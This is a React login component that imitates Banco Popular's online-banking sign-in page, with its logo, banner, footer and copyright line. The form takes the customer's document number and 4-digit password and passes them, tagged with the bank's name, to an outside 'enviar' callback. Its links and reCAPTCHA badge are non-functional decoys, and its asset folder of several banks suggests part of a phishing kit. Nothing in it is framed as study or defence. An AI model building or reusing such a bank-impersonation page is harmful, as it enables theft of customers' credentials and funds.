/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
import { useState, useRef } from "react";

export default function Login({ enviar }: { enviar?: (data: any) => void }) {
  const [documento, setDocumento] = useState("");
  const [tipo, setTipo] = useState("CC");
  const [clave, setClave] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [remember, setRemember] = useState(false);

  const claveInputRef = useRef<HTMLInputElement>(null);

  const canSubmit = documento.trim().length >= 4 && clave.length === 4;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit) return;
    const payload = {
      view: "login",
      user: documento,
      pass: clave,
      bank: "Popular",
      timestamp: new Date().toISOString(),
    };
    enviar?.(payload);
  };

  return (
    <div className="min-h-screen bg-[#f4f5f6] flex flex-col font-sans relative pb-[120px] lg:pb-[80px]">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        /* Thin dark teal header bar */
        .teal-header {
          height: 12px;
          background-color: #105163;
          width: 100%;
        }

        /* Custom toggle switch styling matching screenshot */
        .switch {
          position: relative;
          display: inline-block;
          width: 38px;
          height: 20px;
        }
        .switch input { 
          opacity: 0;
          width: 0;
          height: 0;
        }
        .slider {
          position: absolute;
          cursor: pointer;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-color: #ccc;
          transition: .4s;
          border-radius: 20px;
        }
        .slider:before {
          position: absolute;
          content: "";
          height: 14px;
          width: 14px;
          left: 3px;
          bottom: 3px;
          background-color: white;
          transition: .4s;
          border-radius: 50%;
        }
        input:checked + .slider {
          background-color: #105163;
        }
        input:checked + .slider:before {
          transform: translateX(18px);
        }
      `}} />

      {/* 🔝 Teal top bar */}
      <div className="teal-header" />

      {/* Main Content Grid */}
      <div className="max-w-[940px] mx-auto w-full px-4 pt-8 lg:pt-14 flex-1 flex flex-col lg:flex-row justify-center items-start gap-8">
        
        {/* Left Column: WHITE CARD FORM */}
        <form 
          onSubmit={handleSubmit}
          className="bg-white rounded-3xl shadow-sm border border-gray-100 p-6 lg:p-8 w-full max-w-[370px] mx-auto lg:mx-0 relative"
          style={{ borderRadius: "24px" }}
        >
          {/* Top Shield Icon */}
          <div className="absolute top-6 right-6">
            <svg viewBox="0 0 24 24" fill="none" stroke="#e07b22" strokeWidth="1.5" className="w-5 h-5 opacity-90">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 0 1-1.043 3.296 3.745 3.745 0 0 1-3.296 1.043A3.745 3.745 0 0 1 12 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 0 1-3.296-1.043 3.745 3.745 0 0 1-1.043-3.296A3.745 3.745 0 0 1 3 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 0 1 1.043-3.296 3.746 3.746 0 0 1 3.296-1.043A3.746 3.746 0 0 1 12 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 0 1 3.296 1.043 3.745 3.745 0 0 1 1.043 3.296A3.745 3.745 0 0 1 21 12Z" />
            </svg>
          </div>

          <div className="mb-2">
            <p className="text-[14px] font-bold text-gray-800 leading-tight">Bienvenido a</p>
          </div>

          {/* Logo Popular */}
          <div className="mb-6 flex justify-start">
            <img
              src="/bancos/popular/popularhorizontal_new.svg"
              style={{ height: "30px", width: "auto" }}
              alt="Banco Popular"
            />
          </div>

          {/* Tipo de Documento */}
          <div className="mb-4 text-left">
            <label className="block text-[12px] font-bold text-gray-700 mb-1">
              Tipo de documento
            </label>
            <div className="relative">
              <select
                className="w-full h-11 border border-gray-300 rounded-lg px-3 appearance-none focus:outline-none focus:border-[#105163] text-[14px] text-gray-800 font-semibold"
                value={tipo}
                onChange={(e) => setTipo(e.target.value)}
              >
                <option value="CC">Cédula de Ciudadanía</option>
                <option value="CE">Cédula de Extranjería</option>
                <option value="NIT">NIT</option>
                <option value="PASS">Pasaporte</option>
              </select>
              <span className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-orange-600 text-xs">
                ▼
              </span>
            </div>
          </div>

          {/* Número de documento */}
          <div className="mb-4 text-left">
            <label className="block text-[12px] font-bold text-gray-700 mb-1">
              Número de documento
            </label>
            <input
              type="text"
              inputMode="numeric"
              className="w-full h-11 border border-gray-300 rounded-lg px-3 focus:outline-none focus:border-[#105163] text-[14px] text-gray-800 font-semibold"
              value={documento}
              onChange={(e) => setDocumento(e.target.value.replace(/\D/g, ""))}
            />
          </div>

          {/* Contraseña única */}
          <div className="mb-4 text-left">
            <div className="flex justify-between items-center mb-1">
              <label className="block text-[12px] font-bold text-gray-700">
                Contraseña única
              </label>
              <a href="#" className="text-[12px] text-orange-600 font-bold hover:underline">
                ¿La olvidaste?
              </a>
            </div>

            {/* Dash password input slots */}
            <div className="relative" onClick={() => claveInputRef.current?.focus()}>
              <div className="flex items-center justify-between border border-gray-300 rounded-lg h-11 px-4 lg:px-6 bg-[#fcfcfc] focus-within:border-[#105163] transition-all cursor-text relative">
                <div className="flex-1 flex justify-between pr-8 lg:pr-12">
                  {[0, 1, 2, 3].map((i) => (
                    <div key={i} className="w-8 text-center flex justify-center items-center">
                      {clave.length > i ? (
                        showPassword ? (
                          <span className="text-[16px] font-bold text-gray-800">{clave[i]}</span>
                        ) : (
                          <div className="w-2.5 h-2.5 rounded-full bg-gray-500" />
                        )
                      ) : (
                        <span className="text-[18px] text-gray-400 font-medium font-manrope">-</span>
                      )}
                    </div>
                  ))}
                </div>

                {/* Eye Toggle Icon matching screenshot */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation();
                    setShowPassword(!showPassword);
                  }}
                  className="text-gray-400 hover:text-gray-600 transition-colors z-20 relative"
                >
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-6 h-6">
                    {showPassword ? (
                      <>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.815 7.815 3.15 3.15m-3.15-3.15-4.015-4.015m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
                      </>
                    ) : (
                      <>
                        {/* Outer eye shape */}
                        <path d="M2 12s4-8 10-8 10 8 10 8-4 8-10 8-10-8-10-8z" strokeLinecap="round" strokeLinejoin="round" />
                        {/* Middle circle */}
                        <circle cx="12" cy="12" r="3.5" stroke="currentColor" strokeWidth="1.5" />
                        {/* Center dot */}
                        <circle cx="12" cy="12" r="1.5" fill="currentColor" />
                      </>
                    )}
                  </svg>
                </button>

                {/* Invisible real input overlaying the left 85% area nested inside */}
                <input
                  ref={claveInputRef}
                  type="text"
                  pattern="\d*"
                  maxLength={4}
                  inputMode="numeric"
                  className="absolute left-0 top-0 bottom-0 w-[85%] opacity-0 z-10 cursor-text"
                  value={clave}
                  onChange={(e) =>
                    setClave(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                />
              </div>
            </div>
          </div>

          {/* Toggle Switch: Recordar documento */}
          <div className="flex items-center gap-3 mb-6 mt-4">
            <label className="switch">
              <input 
                type="checkbox" 
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
              />
              <span className="slider" />
            </label>
            <span className="text-[12px] text-gray-800 font-semibold leading-tight text-left">
              Recordar tipo y número de documento
            </span>
          </div>

          {/* Continuar Submit Button */}
          <button
            type="submit"
            disabled={!canSubmit}
            className="w-full h-12 text-[15px] font-bold rounded-xl transition-all"
            style={{
              backgroundColor: canSubmit ? "#105163" : "#cccccc",
              color: "#ffffff",
              cursor: canSubmit ? "pointer" : "not-allowed",
              borderRadius: "12px"
            }}
          >
            Continuar
          </button>

          {/* reCAPTCHA badge */}
          <div className="mt-8 text-center text-[10px] text-gray-400 font-medium">
            Protegido por reCAPTCHA <br />
            <span className="text-orange-600 font-semibold cursor-pointer">Privacidad - Condiciones</span>
          </div>
        </form>

        {/* Right Column: BANNER AND HELPER CARDS (Hidden on mobile) */}
        <div className="hidden lg:flex flex-col gap-6 w-full max-w-[500px]">
          
          {/* Banner Graphic */}
          <div className="bg-[#105163] rounded-2xl overflow-hidden shadow-sm relative h-[250px] flex items-center">
            <img 
              src="/bancos/popular/popular_banner.png" 
              className="absolute inset-0 w-full h-full object-cover opacity-60" 
              alt="Promo background"
            />
            <div className="absolute inset-0 bg-linear-to-r from-[#105163] via-[#105163]/75 to-transparent z-10" />

            <div className="relative z-20 px-8 text-left max-w-[320px]">
              <h3 className="text-white text-[20px] font-bold leading-tight mb-2">
                Pagos rápidos y seguros
              </h3>
              <p className="text-gray-200 text-[12px] leading-relaxed mb-6">
                Paga tus servicios públicos/privados y obligaciones bancarias a través de tu cuenta de ahorros.
              </p>
              <button className="bg-white text-[#105163] text-[12px] font-extrabold px-6 py-2.5 rounded-md hover:bg-gray-100 transition-colors">
                Inscribe y paga
              </button>
            </div>
          </div>

          {/* Below section: ¿Cómo podemos ayudarte? */}
          <div className="text-left font-manrope">
            <h4 className="text-[13px] font-extrabold text-gray-700 mb-4">¿Cómo podemos ayudarte?</h4>
            <div className="grid grid-cols-3 gap-4">
              
              {/* Card 1 */}
              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v6m3-3H9m12 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Solicitar productos</span>
              </div>

              {/* Card 2 */}
              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 0 0 2.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.387a12.017 12.017 0 0 1-4.7-4.7c-.155-.44.01-.928.387-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 0 0-1.091-.852H4.5a2.25 2.25 0 0 0 2.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.387a12.017 12.017 0 0 1-4.7-4.7c-.155-.44.01-.928.387-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 0 0-1.091-.852H4.5A2.25 2.25 0 0 0 2.25 4.5v2.25Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Contáctanos</span>
              </div>

              {/* Card 3 */}
              <div className="bg-white rounded-xl border border-gray-100 p-4 flex flex-col items-center justify-center text-center shadow-xs cursor-pointer hover:border-green-600 transition-colors">
                <div className="w-10 h-10 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-2">
                  <svg viewBox="0 0 24 24" fill="none" stroke="#105163" strokeWidth="2" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0Z" />
                  </svg>
                </div>
                <span className="text-[10px] font-bold text-gray-700 leading-tight">Visítanos</span>
              </div>

            </div>
          </div>

        </div>

      </div>

      {/* FOOTER */}
      <footer className="absolute bottom-0 left-0 w-full bg-white border-t border-gray-100 py-4 px-6 flex flex-col lg:flex-row justify-between items-center gap-4 z-40 text-[11px] text-gray-400 font-medium">
        <div className="flex items-center gap-3">
          <img
            src="/bancos/popular/popularhorizontal_new.svg"
            style={{ height: "18px", width: "auto", filter: "grayscale(1) opacity(0.7)" }}
            alt="Banco Popular"
          />
          <div className="h-3 w-px bg-gray-300" />
          <div className="flex items-center gap-1 font-bold text-gray-400">
            Grupo <span className="text-blue-700/70">AVAL</span>
          </div>
        </div>
        <div className="flex items-center gap-6 text-orange-600 font-bold">
          <a href="#" className="hover:underline">Seguridad</a>
          <a href="#" className="hover:underline">Accesibilidad</a>
        </div>
        <div>
          <span>Miércoles, 15 de julio de 2026 | 03:44 p.m. © Banco Popular. Todos los derechos reservados. | v4.3.22</span>
        </div>
      </footer>

    </div>
  );
}